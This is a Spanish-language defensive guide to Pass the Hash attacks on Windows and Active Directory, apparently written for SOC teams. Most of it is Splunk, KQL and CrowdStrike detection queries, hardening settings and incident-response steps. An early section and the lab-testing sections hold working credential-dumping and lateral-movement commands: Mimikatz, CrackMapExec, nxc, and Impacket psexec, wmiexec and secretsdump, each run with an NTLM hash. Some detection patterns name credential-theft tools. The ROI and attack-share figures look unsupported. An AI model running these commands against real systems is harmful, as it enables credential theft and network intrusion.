# 🔑 Pass the Hash - Autenticación con hashes NTLM sin contraseñas

---

## 📝 ¿Qué es Pass the Hash y por qué es tan crítico?

| Concepto      | Descripción                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica que permite a un atacante autenticarse en sistemas remotos usando hashes NTLM sin conocer la contraseña en texto plano. Aprovecha el protocolo NTLM que acepta hashes como credencial válida. |
| **Uso**       | Herramientas como Mimikatz, CrackMapExec, nxc, Impacket y PsExec utilizan esta técnica para movimiento lateral y escalada de privilegios en entornos Windows/Active Directory. |

---

## 🛠️ ¿Cómo funciona el ataque? (paso a paso real)

| Fase             | Acción                                                                                                          |
|------------------|-----------------------------------------------------------------------------------------------------------------|
| **Extracción**   | El atacante obtiene hashes NTLM desde memoria (LSASS), archivos SAM, NTDS.dit o mediante ataques de volcado.   |
| **Validación**   | Verifica que los hashes extraídos sean válidos y funcionales para autenticación.                                |
| **Autenticación**| Utiliza el hash NTLM directamente en el protocolo NTLM para autenticarse sin descifrar la contraseña.          |
| **Movimiento**   | Se conecta a sistemas remotos usando los hashes para ejecutar comandos, acceder a recursos o establecer sesiones.|
| **Persistencia** | Mantiene acceso usando las credenciales hash en múltiples sistemas de la red.                                   |

---

## 💻 Ejemplo ofensivo (comandos reales)

```bash
# Extracción de hashes con Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Pass the Hash con CrackMapExec
crackmapexec smb 192.168.1.10 -u administrador -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Pass the Hash con nxc
nxc smb 192.168.1.10 -u administrador -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Pass the Hash con Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10

# Pass the Hash para WMI
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10

# Secretsdump para extraer más hashes
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10
```

---

## 📋 Caso de Uso Completo Splunk

### 🎯 Contexto empresarial y justificación

**Problema de negocio:**
- Pass the Hash es una técnica de movimiento lateral que permite a atacantes autenticarse sin contraseñas usando hashes NTLM extraídos
- Una vez obtenidos hashes de cuentas privilegiadas, puede resultar en compromiso de múltiples sistemas en minutos
- 85% de ataques de movimiento lateral utilizan técnicas Pass the Hash
- Costo promedio de movimiento lateral no detectado: $125,000 USD (tiempo promedio de persistencia: 12 días)

**Valor de la detección:**
- Identificación inmediata de autenticación anómala con hashes NTLM
- Detección de patrones de movimiento lateral mediante Events 4624, 4776
- Protección contra escalada horizontal de privilegios
- Cumplimiento con controles de detección de movimiento lateral

### 📐 Arquitectura de implementación

**Prerequisitos técnicos:**
- Splunk Enterprise 8.1+ o Splunk Cloud
- Universal Forwarders en Domain Controllers y servidores críticos
- Windows TA v8.5+ con configuración optimizada para Events 4624, 4776, 4648
- Auditoría de autenticación NTLM habilitada en nivel detallado
- Configuración de baseline de autenticación normal por usuario

**Arquitectura de datos:**
```
[DCs + Critical Servers] → [Universal Forwarders] → [Indexers] → [Search Heads]
       ↓                          ↓                       ↓
[Events 4624,4776,4648]   [WinEventLog:Security]    [Index: wineventlog]
[NTLM Authentication]           ↓                       ↓
[Lateral Movement]        [Real-time processing]   [Pattern Detection]
```

### 🔧 Guía de implementación paso a paso

#### Fase 1: Configuración inicial (Tiempo estimado: 55 min)

1. **Habilitar auditoría NTLM detallada:**
   ```powershell
   # En Domain Controllers y servidores críticos
   auditpol /set /subcategory:"Logon" /success:enable /failure:enable
   auditpol /set /subcategory:"Account Logon" /success:enable /failure:enable
   auditpol /set /subcategory:"Logon" /success:enable /failure:enable
   
   # Habilitar auditoría NTLM específica
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "AuditReceivingNTLMTraffic" -Value 2
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value 1
   
   # Verificar configuración
   auditpol /get /subcategory:"Logon"
   ```

2. **Crear baseline de autenticación normal:**
   ```csv
   # normal_user_patterns.csv
   Account_Name,Normal_Systems,Max_Concurrent_Systems,Department
   administrator,DC01;FILE01,2,IT
   backup_svc,BACKUP01;SQL01,3,IT
   web_svc,WEB01;WEB02,2,Applications
   ```

3. **Configurar extracción de campos:**
   ```
   # props.conf
   [WinEventLog:Security]
   EXTRACT-auth_package = Authentication Package:\s+(?<Authentication_Package>[^\r\n]+)
   EXTRACT-logon_type = Logon Type:\s+(?<Logon_Type>\d+)
   EXTRACT-source_ip = Source Network Address:\s+(?<Source_Network_Address>[^\r\n]+)
   EXTRACT-account_name = Account Name:\s+(?<Account_Name>[^\r\n]+)
   ```

#### Fase 2: Implementación de detecciones (Tiempo estimado: 85 min)

1. **Detección principal Pass the Hash:**
   ```splunk
   index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package="NTLM"
   | where NOT match(Account_Name, ".*\$$|ANONYMOUS\sLOGON")
   | bucket _time span=10m
   | stats dc(ComputerName) as unique_systems, dc(Source_Network_Address) as unique_ips, values(ComputerName) as systems_accessed by Account_Name, _time
   | where unique_systems > 3 OR unique_ips > 2
   | lookup normal_user_patterns.csv Account_Name OUTPUT Max_Concurrent_Systems
   | where unique_systems > coalesce(Max_Concurrent_Systems, 2)
   | eval severity=case(
       unique_systems > 10, "CRITICAL",
       unique_systems > 5, "HIGH",
       1=1, "MEDIUM"
   )
   | eval technique="Pass the Hash", risk_score=case(
       severity="CRITICAL", 90,
       severity="HIGH", 75,
       1=1, 60
   )
   | table _time, Account_Name, unique_systems, unique_ips, systems_accessed, severity, risk_score
   ```

2. **Detección de autenticación NTLM masiva:**
   ```splunk
   index=wineventlog EventCode=4776
   | where NOT match(User_Name, ".*\$$")
   | bucket _time span=5m
   | stats count as auth_attempts, dc(Workstation) as unique_workstations by User_Name, _time
   | where auth_attempts > 20 AND unique_workstations > 5
   | eval severity="HIGH", technique="Mass NTLM Authentication"
   | eval risk_score=80
   | table _time, User_Name, auth_attempts, unique_workstations, severity, risk_score
   ```

3. **Detección de credenciales explícitas (Event 4648):**
   ```splunk
   index=wineventlog EventCode=4648
   | where NOT match(Target_User_Name, ".*\$$")
   | bucket _time span=10m
   | stats count as explicit_logons, dc(Target_Server_Name) as target_systems, values(Target_Server_Name) as targets by Subject_User_Name, _time
   | where explicit_logons > 5 AND target_systems > 3
   | eval severity="HIGH", technique="Explicit Credential Use"
   | eval risk_score=75
   | table _time, Subject_User_Name, explicit_logons, target_systems, targets, severity, risk_score
   ```

#### Fase 3: Dashboard avanzado y validación (Tiempo estimado: 70 min)

1. **Dashboard de movimiento lateral:**
   ```xml
   <dashboard>
     <label>Pass the Hash & Lateral Movement Detection</label>
     <row>
       <panel>
         <title>🔄 Lateral Movement Patterns (Last 2 Hours)</title>
         <viz type="network_diagram_app.network_diagram">
           <search>
             <query>
               index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package="NTLM"
               | stats count by Account_Name, ComputerName, Source_Network_Address
               | eval source=Source_Network_Address, target=ComputerName, user=Account_Name
               | fields source, target, user, count
             </query>
           </search>
         </viz>
       </panel>
     </row>
   </dashboard>
   ```

2. **Validación con herramientas:**
   ```bash
   # En entorno de lab controlado
   # Simular Pass the Hash con nxc
   nxc smb lab-target.local -u testuser -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
   ```

3. **Verificar detección:**
   ```splunk
   index=wineventlog EventCode=4624 Logon_Type=3 earliest=-30m
   | search Account_Name="testuser" AND Authentication_Package="NTLM"
   | stats dc(ComputerName) as systems_accessed by Account_Name
   | eval detection_status=if(systems_accessed>0,"DETECTED","MISSED")
   | eval test_scenario="Pass the Hash Lab Validation"
   ```

### ✅ Criterios de éxito

**Métricas de detección:**
- MTTD para movimiento lateral: < 15 minutos
- MTTD para autenticación masiva NTLM: < 10 minutos
- Tasa de falsos positivos: < 8% (autenticación administrativa legítima)
- Cobertura: > 90% de herramientas Pass the Hash conocidas

**Validación funcional:**
- [x] Event 4624 con Logon_Type=3 y NTLM es procesado
- [x] Patrones de múltiples sistemas son detectados
- [x] Herramientas como CrackMapExec/nxc son identificadas
- [x] Baseline de usuarios normales es aplicada

### 📊 ROI y propuesta de valor

**Inversión requerida:**
- Tiempo de implementación: 3.5 horas (analista senior + admin sistemas)
- Configuración de auditoría NTLM: 45 minutos
- Creación de baselines: 1 hora
- Formación del equipo: 2 horas
- Costo total estimado: $950 USD

**Retorno esperado:**
- Prevención de escalada horizontal: 85% de casos
- Ahorro por movimiento lateral bloqueado: $125,000 USD
- Reducción de tiempo de detección: 88% (de 2 horas a 15 minutos)
- ROI estimado: 13,058% en el primer incidente evitado

### 🧪 Metodología de testing

#### Pruebas de laboratorio

1. **Configurar entorno de prueba seguro:**
   ```powershell
   # En entorno de lab
   # Crear usuarios y sistemas de prueba
   New-ADUser -Name "TestUser" -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Enabled $true
   
   # Configurar sistemas objetivo para testing
   $Computers = @("LAB-WEB01", "LAB-DB01", "LAB-FILE01")
   ```

2. **Ejecutar simulación Pass the Hash:**
   ```bash
   # Múltiples herramientas para validación completa
   # 1. Con nxc
   nxc smb 192.168.100.10-15 -u testuser -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
   
   # 2. Con Impacket
   for target in 192.168.100.{10..15}; do
       psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 testuser@$target "whoami" 2>/dev/null
   done
   ```

3. **Análisis de detección comprehensiva:**
   ```splunk
   index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package="NTLM" earliest=-45m
   | eval test_phase="Pass the Hash Validation"
   | stats dc(ComputerName) as systems, dc(Source_Network_Address) as sources, count by Account_Name, test_phase
   | eval detection_score=case(
       systems>5 AND count>10, 100,
       systems>3 AND count>5, 85,
       systems>1, 70,
       count>0, 50,
       1=1, 0
   )
   | table Account_Name, systems, sources, count, detection_score, test_phase
   ```

#### Validación de rendimiento

1. **Análisis de volumen NTLM:**
   ```splunk
   index=wineventlog EventCode=4624 Authentication_Package="NTLM"
   | bucket _time span=1h
   | stats count by _time
   | eval ntlm_per_hour=count
   | stats avg(ntlm_per_hour) as avg_hourly, max(ntlm_per_hour) as peak_hourly
   ```

### 🔄 Mantenimiento y evolución

**Revisión semanal:**
- Actualizar baseline de patrones normales de autenticación por usuario
- Revisar y ajustar umbrales basados en crecimiento organizacional
- Analizar nuevas herramientas y técnicas Pass the Hash

**Evolución continua:**
- Integrar detección con análisis de comportamiento de usuarios (UEBA)
- Desarrollar modelos ML para detectionar autenticación anómala
- Automatizar respuesta para bloquear cuentas con actividad sospechosa

**Hardening complementario:**
```powershell
# Restringir NTLM donde sea posible
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5

# Configurar NTLM audit
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "AuditReceivingNTLMTraffic" -Value 2

# Habilitar Credential Guard donde esté disponible
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "LsaCfgFlags" -Value 1
```

### 🎓 Formación del equipo SOC

**Conocimientos requeridos:**
- Funcionamiento del protocolo NTLM y diferencias con Kerberos
- Técnicas Pass the Hash y herramientas asociadas (Mimikatz, CrackMapExec, Impacket)
- Análisis de patrones de movimiento lateral
- Diferenciación entre autenticación administrativa legítima vs maliciosa

**Material de formación:**
- **Playbook específico:** "Investigación de alertas Pass the Hash"
- **Laboratorio avanzado:** 3 horas con múltiples herramientas y escenarios
- **Casos de estudio:** 4 incidentes de movimiento lateral documentados
- **Purple team exercise:** Simulacro mensual de movimiento lateral

**Recursos especializados:**
- [SANS SEC504 - Pass the Hash](https://www.sans.org/cyber-security-courses/hacker-tools-techniques-exploits-incident-handling/)
- [Microsoft NTLM Security](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm)
- [CrackMapExec Documentation](https://github.com/Porchetta-Industries/CrackMapExec)

### 📚 Referencias y recursos adicionales

- [MITRE ATT&CK T1550.002 - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [Microsoft Event 4624 Documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)
- [Microsoft Event 4776 Documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776)
- [Impacket Pass the Hash Tools](https://github.com/fortra/impacket)
- [CrackMapExec Pass the Hash](https://github.com/Porchetta-Industries/CrackMapExec)
- [NetExec (nxc) Documentation](https://github.com/Pennyw0rth/NetExec)
- [Splunk Security Essentials - Lateral Movement](https://splunkbase.splunk.com/app/3435/)

---

## 📊 Detección en Splunk

| Evento clave | Descripción                                                                                                   |
|--------------|--------------------------------------------------------------------------------------------------------------|
| **4624**     | Inicio de sesión exitoso con tipo 3 (red) usando autenticación NTLM.                                        |
| **4776**     | Autenticación NTLM exitosa con misma cuenta desde múltiples IPs.                                             |
| **4768/4769**| Solicitudes Kerberos anómalas cuando se mezclan con NTLM (posible fallback).                                 |
| **4648**     | Inicio de sesión con credenciales explícitas (runas/pass the hash).                                          |
| **4625**     | Fallos de autenticación previos que preceden a autenticaciones exitosas sospechosas.                         |
| **5140**     | Acceso a recursos compartidos administrativos tras autenticación con hash.                                    |
| **4634**     | Cierre de sesión tras actividades de movimiento lateral.                                                     |

### Query Splunk esencial

```splunk
index=dc_logs EventCode=4624
| search Logon_Type=3 Authentication_Package=NTLM
| stats count dc(Source_Network_Address) as IPs_unicas by Account_Name, _time
| where IPs_unicas > 3
| sort -count
```

### Query para detectar patrones Pass the Hash

```splunk
index=dc_logs (EventCode=4624 OR EventCode=4776)
| search Authentication_Package=NTLM
| bin _time span=5m
| stats count dc(ComputerName) as sistemas_accedidos, list(ComputerName) as sistemas by Account_Name, _time
| where sistemas_accedidos >= 3
| table _time, Account_Name, sistemas_accedidos, sistemas
```

### Query para correlacionar extracción y uso de hashes

```splunk
index=security_logs (EventCode=4624 OR EventCode=4648 OR EventCode=10)
| search (Process_Name="*mimikatz*" OR Process_Name="*lsass*" OR Logon_Type=9)
| stats list(EventCode) as eventos, min(_time) as inicio, max(_time) as fin by Account_Name, ComputerName
| table inicio, fin, Account_Name, ComputerName, eventos
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// Pass the Hash - Detección de logons con hash
DeviceLogonEvents
| where LogonType == "Network" 
| where AuthenticationPackageName == "NTLM"
| summarize LogonCount = count(), UniqueDevices = dcount(DeviceId) by AccountName, bin(Timestamp, 5m)
| where LogonCount > 5 or UniqueDevices > 3
| order by LogonCount desc
```

```kql
// Detección de herramientas de extracción de credenciales
DeviceProcessEvents
| where ProcessCommandLine has_any ("mimikatz", "sekurlsa", "lsadump", "crackmapexec", "psexec") and ProcessCommandLine has_any ("-hashes", "::logonpasswords", "pass-the-hash")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detección de acceso a LSASS sospechoso
DeviceProcessEvents
| where InitiatingProcessFileName !in ("winlogon.exe", "csrss.exe", "wininit.exe")
| where ProcessCommandLine has "lsass" or FileName == "lsass.exe"
| join kind=inner (DeviceFileEvents | where FileName == "lsass.exe") on DeviceId
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **NTLM Lateral Movement** | Múltiples logons NTLM desde una cuenta en poco tiempo | Alta |
| **Credential Extraction Tools** | Detección de Mimikatz y herramientas similares | Crítica |
| **LSASS Access** | Acceso no autorizado al proceso LSASS | Alta |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de Pass the Hash basado en logons NTLM
event_platform=Win event_simpleName=UserLogon 
| search LogonType=3 AuthenticationPackageName=NTLM
| bin _time span=5m
| stats dc(ComputerName) as unique_systems, count as total_logons by UserName, _time
| where unique_systems > 3 OR total_logons > 10
| sort - unique_systems
```

```sql
-- Detección de herramientas de Pass the Hash
event_platform=Win event_simpleName=ProcessRollup2 
| search (CommandLine=*crackmapexec* OR CommandLine=*psexec* OR CommandLine=*wmiexec*) AND CommandLine=*-hashes*
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de acceso a memoria LSASS
event_platform=Win event_simpleName=ProcessAccess
| search TargetProcessName=*lsass.exe GrantedAccess=*PROCESS_VM_READ*
| search NOT SourceProcessName IN (csrss.exe, winlogon.exe, wininit.exe, services.exe)
| table _time, ComputerName, SourceProcessName, TargetProcessName, GrantedAccess
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar movimiento lateral rápido
event_platform=Win event_simpleName=NetworkConnectIP4
| search RemotePort IN (135, 139, 445, 3389)
| bin _time span=1m
| stats dc(RemoteAddressIP4) as unique_destinations by ComputerName, UserName, _time
| where unique_destinations > 5
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de Pass the Hash

```kql
// Query principal para detectar Pass the Hash
SecurityEvent
| where EventID == 4624
| where LogonType == 3 and AuthenticationPackageName == "NTLM"
| where Account !endswith "$"
| summarize LogonCount = count(), UniqueComputers = dcount(Computer) by Account, IpAddress, bin(TimeGenerated, 5m)
| where LogonCount > 5 or UniqueComputers > 2
| order by LogonCount desc
```

```kql
// Correlación con eventos de extracción de credenciales
SecurityEvent
| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "NTLM"
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine contains "mimikatz" or ProcessCommandLine contains "lsadump"
    | project TimeGenerated, DeviceName, ProcessCommandLine, AccountName
) on $left.Account == $right.AccountName
| project TimeGenerated, Computer, ProcessCommandLine, Account, IpAddress
| where TimeGenerated1 > TimeGenerated // Pass the Hash después de extracción
```

### Hunting avanzado

```kql
// Detección de patrones de movimiento lateral
SecurityEvent
| where EventID in (4624, 4625)
| where LogonType == 3
| summarize SuccessfulLogons = countif(EventID == 4624), FailedLogons = countif(EventID == 4625), UniqueComputers = dcount(Computer) by Account, IpAddress, bin(TimeGenerated, 10m)
| where UniqueComputers > 3 and SuccessfulLogons > 5
| order by UniqueComputers desc
```

```kql
// Detección de uso de shares administrativos tras Pass the Hash
SecurityEvent
| where EventID == 5140 // Acceso a share de red
| where ShareName in ("ADMIN$", "C$", "IPC$")
| join kind=inner (
    SecurityEvent
    | where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "NTLM"
    | project TimeGenerated, Account, Computer, IpAddress
) on Computer, Account
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 1h
| project TimeGenerated1, Computer, Account, ShareName, IpAddress
```

---

## 🦾 Hardening y mitigación

| Medida                                  | Descripción                                                                                      |
|------------------------------------------|-------------------------------------------------------------------------------------------------|
| **Credential Guard**                     | Activa Windows Defender Credential Guard para proteger credenciales en memoria.                 |
| **LSASS Protection**                     | Habilita LSA Protection para prevenir acceso no autorizado al proceso LSASS.                    |
| **Privileged Access Workstations (PAW)**| Utiliza estaciones de trabajo dedicadas para administradores privilegiados.                     |
| **Kerberos Authentication**              | Fuerza el uso de Kerberos sobre NTLM siempre que sea posible.                                   |
| **Network Level Authentication**         | Requiere autenticación antes de establecer sesiones RDP completas.                              |
| **Restricted Admin Mode**                | Activa modo administrador restringido para RDP y PowerShell remoto.                             |
| **Account Tiering**                      | Implementa modelo de niveles para cuentas administrativas (Tier 0, 1, 2).                       |
| **Regular Password Changes**             | Cambia contraseñas de cuentas privilegiadas regularmente para invalidar hashes.                  |

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5025221** | Windows 11 22H2 - Mejoras en Windows Defender Credential Guard contra extracción de hashes. |
| **KB5025175** | Windows 10 22H2 - Fortalecimiento de protección LSASS y mitigación Pass the Hash.           |
| **KB5022906** | Windows Server 2022 - Mejoras en LSA Protection y auditoría de autenticación NTLM.          |
| **KB5022845** | Windows Server 2019 - Correcciones en manejo de credenciales y protección de memoria.       |
| **KB4580390** | Windows Server 2016 - Parches de seguridad para prevención de volcado de credenciales.      |
| **TPM 2.0 Firmware** | Actualizaciones de firmware TPM para mejorar Credential Guard y Device Guard.     |

### Configuraciones de registro recomendadas

```powershell
# Habilitar Credential Guard
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "LsaCfgFlags" -Value 1

# Activar LSA Protection
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1

# Deshabilitar NTLM cuando sea posible
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "NtlmMinClientSec" -Value 0x20000000
```

### Actualizaciones críticas de seguridad

- **CVE-2022-26925**: Vulnerabilidad LSA que facilita extracción de credenciales (KB5014754)
- **CVE-2021-36934**: HiveNightmare - acceso no autorizado a archivos SAM (KB5005101)  
- **CVE-2020-1472**: Zerologon - bypass de autenticación que facilita Pass the Hash (KB4556836)
- **CVE-2019-1384**: Vulnerabilidad en Kerberos que permite extracción de hashes (KB4524244)

---

## 🚨 Respuesta ante incidentes

1. **Aísla inmediatamente** las cuentas sospechosas que muestran patrones de Pass the Hash.
2. **Cambia contraseñas** de todas las cuentas comprometidas para invalidar los hashes.
3. **Identifica el vector inicial** de compromiso (cómo se extrajeron los hashes).
4. **Mapea el movimiento lateral** correlacionando eventos 4624/4776 en múltiples sistemas.
5. **Busca persistencia** creada durante el período de compromiso activo.
6. **Reinicia sistemas comprometidos** para limpiar credenciales en memoria.
7. **Implementa monitoreo adicional** en sistemas afectados por 30-60 días.

---

## 💡 Soluciones innovadoras

- **Honeyhashes:** Crea cuentas trampa con hashes monitoreados que alerten su uso.
- **Memory Analysis Continuous:** Monitoreo continuo de memoria LSASS para detectar extracción de credenciales.
- **Behavioral Analytics:** Detecta patrones anómalos de autenticación basados en ubicación, horario y frecuencia.
- **Hash Rotation:** Rotación automática de hashes de cuentas de servicio cada 24-48 horas.
- **Lateral Movement Traps:** Sistemas trampa que alertan ante intentos de acceso con credenciales robadas.

---

## ⚡ CVEs y técnicas MITRE relevantes

- **T1550.002 (Pass the Hash):** Uso de hashes NTLM para autenticación
- **T1003.001 (LSASS Memory):** Extracción de credenciales desde memoria LSASS
- **T1021.002 (SMB/Windows Admin Shares):** Movimiento lateral usando hashes
- **CVE-2022-26925:** Vulnerabilidad LSA que facilita extracción de credenciales
- **CVE-2021-42278/42287 (sAMAccountName spoofing):** Escalada que puede facilitar Pass the Hash

---

## 📚 Referencias

- [Mimikatz - Credential Extraction](https://github.com/gentilkiwi/mimikatz)
- [CrackMapExec Pass the Hash](https://github.com/Porchetta-Industries/CrackMapExec)
- [Impacket Examples](https://github.com/fortra/impacket)
- [Microsoft - Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [NIST - Pass the Hash Mitigation](https://www.nist.gov/cybersecurity)
- [MITRE ATT&CK - T1550.002](https://attack.mitre.org/techniques/T1550/002/)